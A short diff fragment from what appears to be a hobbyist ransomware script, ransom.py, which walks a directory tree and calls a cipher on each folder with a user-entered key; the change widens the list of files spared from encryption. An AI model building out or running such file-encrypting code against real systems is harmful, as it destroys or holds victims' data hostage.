@@ -21,8 +21,7 @@ def ransom(way):
             cipher(f"{way}/{dir}",key)
 
 os.system('clear')
-exclu=["ransom.py","save.py"]
-exclu=["ransom.py","save.py","path.txt"]
+exclu=["ransom.py","save.py","path.txt",".confs", ".config"]
 path= sys.argv[1]
 key = input("Enter a key: ")
 if key =="":
